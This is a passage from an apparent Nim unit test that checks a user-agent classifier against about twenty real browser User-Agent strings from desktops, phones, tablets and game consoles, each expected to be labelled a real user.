      SampleUa(ua: "Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1", expectedCategory: CategoryRealUser, description: "Safari on iPad"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0", expectedCategory: CategoryRealUser, description: "Firefox on Windows"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0", expectedCategory: CategoryRealUser, description: "Firefox on macOS"),
      SampleUa(ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0", expectedCategory: CategoryRealUser, description: "Firefox on Ubuntu"),
      SampleUa(ua: "Mozilla/5.0 (Android 14; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0", expectedCategory: CategoryRealUser, description: "Firefox Mobile Android"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.52", expectedCategory: CategoryRealUser, description: "Edge on Windows"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.52", expectedCategory: CategoryRealUser, description: "Edge on macOS"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0", expectedCategory: CategoryRealUser, description: "Opera on Windows"),
      SampleUa(ua: "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.5790.166 Mobile Safari/537.36", expectedCategory: CategoryRealUser, description: "Samsung Internet Browser"),
      SampleUa(ua: "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", expectedCategory: CategoryRealUser, description: "Generic Chrome Mobile Android"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", expectedCategory: CategoryRealUser, description: "Firefox ESR on Windows 7"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", expectedCategory: CategoryRealUser, description: "Internet Explorer 11 on Windows 10"),
      SampleUa(ua: "Mozilla/5.0 (CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", expectedCategory: CategoryRealUser, description: "ChromeOS Chromebook"),
      SampleUa(ua: "Mozilla/5.0 (PlayStation 5 7.00) AppleWebKit/605.1.15 (KHTML, like Gecko)", expectedCategory: CategoryRealUser, description: "PlayStation 5 Browser"),
      SampleUa(ua: "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.2.22.5 NintendoBrowser/5.1.0.22474", expectedCategory: CategoryRealUser, description: "Nintendo Switch Browser"),
      SampleUa(ua: "Mozilla/5.0 (Linux; Android 11; SM-T500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36", expectedCategory: CategoryRealUser, description: "Galaxy Tab Android Tablet"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.59", expectedCategory: CategoryRealUser, description: "Vivaldi on Windows"),
      SampleUa(ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.62.153", expectedCategory: CategoryRealUser, description: "Brave on Windows"),
      SampleUa(ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.62.153", expectedCategory: CategoryRealUser, description: "Brave on macOS")
    ]

    check samples.len >= 100
    echo "  [Item 06 Verification] Testing ", $samples.len, " distinct User-Agent strings against taxonomy engine..."

    var verifiedCount = 0
    for sample in samples:
      let classification = classifyUserAgent(sample.ua)
      check classification.category == sample.expectedCategory
      inc verifiedCount

    check verifiedCount == samples.len
    echo "  [Item 06 Verification] All ", $verifiedCount, " sample User-Agents classified with 100% accuracy!"
